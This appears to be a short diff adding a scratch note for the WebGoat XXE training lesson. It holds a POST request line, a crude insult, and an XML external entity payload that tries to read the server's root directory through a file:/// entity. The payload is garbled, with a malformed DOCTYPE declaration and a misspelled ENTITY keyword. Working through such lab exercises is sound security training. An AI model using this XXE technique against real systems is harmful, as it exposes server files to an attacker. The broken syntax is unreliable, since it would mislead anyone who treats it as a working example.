@@ -1,0 +1,5 @@
+POST /WebGoat/xxe/simple HTTP/1.1
+is what u need in life bixch....
+
+--------------
+<?xml version="1.0"?<>!DOCTYPE comment [<!ENTITTY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
